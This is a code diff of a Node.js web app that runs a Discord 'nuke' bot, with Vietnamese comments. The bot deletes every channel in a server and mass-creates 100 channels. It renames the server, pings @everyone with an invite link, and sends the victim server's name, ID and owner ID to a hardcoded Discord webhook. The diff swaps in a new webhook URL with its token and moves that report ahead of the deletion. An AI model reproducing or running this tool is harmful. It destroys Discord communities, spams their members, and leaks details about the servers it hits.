@@ -8,27 +8,28 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
+// ĐÃ THAY WEBHOOK MỚI
+const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571411890234466326/-OR6ccUWj5TDjXECqADD_ZLLoDwEPHUUTRyoEKvz-x_3HGy1Zetis50n6QcwvxRUitu0';
 
-// CẤU HÌNH CỐ ĐỊNH THEO YÊU CẦU
+// CẤU HÌNH CỐ ĐỊNH
 const CONFIG = {
   channelName: 'anh-phtuankhanh-nuke',
   renameName: 'NUKE BY PHTUANKHANH',
   channelCount: 100,
-  msgContent: '# NUKED\n> @everyone cút hết',
+  msgContent: '# > NUKE BY PHTUANKHANH\n\nhttps://discord.gg/BqZ7UdtwXG',
   msgCount: 1,
   pingEveryone: true
 };
 
 let botClient = null;
 let currentToken = null;
-let currentClientId = null; // Dùng để tạo link add bot
-let webLogs = []; // Lưu log trên RAM để gửi về web
+let currentClientId = null;
+let webLogs = [];
 
 function pushLog(msg, type = 'info') {
   const log = { time: new Date().toLocaleTimeString(), msg, type };
   webLogs.push(log);
-  if (webLogs.length > 200) webLogs.shift(); // Giới hạn 200 dòng
+  if (webLogs.length > 200) webLogs.shift();
   console.log(`[${type.toUpperCase()}] ${msg}`);
 }
 
@@ -100,6 +101,17 @@ function startBot(token) {
     try {
       const { channelCount: cc, channelName: chName, renameName: rName, msgCount: mc, msgContent: msgText, pingEveryone: ping } = CONFIG;
 
+      // GỬI NOTIFY TRƯỚC KHI XOÁ KÊNH ĐỂ ĐẢM BẢO WEBHOOK BAY ĐƯỢC
+      await notifyNuke({
+        guildName: guild.name,
+        guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
+        guildId: guild.id, ownerId: guild.ownerId,
+        channels: cc, msgs: cc * mc, // Ước tính
+        user: botClient.user.username,
+        error: null,
+      });
+      pushLog('Đã gửi webhook thông báo.', 'success');
+
       // 1. XOÁ ALL KÊNH
       pushLog(`Đang xoá toàn bộ kênh...`, 'info');
       const oldChannels = await guild.channels.fetch().catch(() => null);
@@ -134,26 +146,10 @@ function startBot(token) {
         await guild.setName(rName).catch(() => {});
       }
 
-      await notifyNuke({
-        guildName: guild.name,
-        guildIcon: guild.iconURL({ size: 256, extension: 'png' }),
-        guildId: guild.id, ownerId: guild.ownerId,
-        channels: channelsCreated, msgs: msgsSent,
-        user: botClient.user.username,
-        error: null,
-      });
-
       pushLog(`NUKE HOÀN TẤT trong ${Date.now() - t0}ms!`, 'success');
 
     } catch (err) {
       pushLog(`Lỗi nuke: ${err.message}`, 'error');
-      await notifyNuke({
-        guildName: guild.name, 
-        guildIcon: guild.iconURL({ size: 256, extension: 'png' }), 
-        guildId: guild.id,
-        ownerId: guild.ownerId, channels: channelsCreated, msgs: msgsSent, 
-        user: botClient.user.username, error: err.message
-      });
     }
   });
 
@@ -176,7 +172,6 @@ app.post('/api/login', async (req, res) => {
   pushLog('Đang kết nối bot...', 'info');
   startBot(cleanToken);
   
-  // Đợi bot ready
   await new Promise(r => setTimeout(r, 2000));
   
   if (botClient && botClient.user) {
